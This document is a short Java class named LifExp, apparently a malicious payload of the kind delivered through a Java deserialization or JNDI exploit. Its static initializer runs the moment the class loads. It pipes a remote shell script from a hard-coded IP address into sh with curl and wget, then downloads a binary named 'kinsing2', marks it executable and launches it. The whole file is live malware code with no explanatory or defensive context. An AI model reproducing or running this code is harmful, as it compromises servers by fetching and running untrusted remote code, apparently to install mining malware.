import java.net.URLConnection;
import java.io.FileOutputStream;
import java.io.BufferedInputStream;
import java.net.URL;
import java.io.File;
import java.util.Random;

public class LifExp
{
    static {
        try {
            final String s = "144.217.117.146/lf.sh";
            Runtime.getRuntime().exec(new String[] { "/bin/bash", "-c", "curl " + s + "|sh" });
            Runtime.getRuntime().exec(new String[] { "/bin/bash", "-c", "wget -q -O - " + s + "|sh" });
            final Random random = new Random();
            random.setSeed(System.currentTimeMillis());
            final String string = "kinsing" + random.nextInt();
            final File file = new File(string);
            final URLConnection openConnection = new URL("http://144.217.117.146/kinsing2").openConnection();
            openConnection.setRequestProperty("User-Agent", System.getProperty("java.version") + "_" + System.getProperty("os.name").toLowerCase());
            final BufferedInputStream bufferedInputStream = new BufferedInputStream(openConnection.getInputStream());
            try {
                final FileOutputStream fileOutputStream = new FileOutputStream(file);
                final byte[] array = new byte[1024];
                int read;
                while ((read = bufferedInputStream.read(array, 0, 1024)) != -1) {
                    fileOutputStream.write(array, 0, read);
                }
                fileOutputStream.close();
            }
            catch (Exception ex2) {}
            bufferedInputStream.close();
            System.out.println(file.getAbsolutePath());
            Runtime.getRuntime().exec("chmod +x " + string).waitFor();
            final ProcessBuilder processBuilder = new ProcessBuilder(new String[] { "./" + string });
            processBuilder.inheritIO();
            processBuilder.environment().put("SKL", "lf");
            processBuilder.start();
        }
        catch (Exception ex) {
            ex.printStackTrace();
        }
    }
}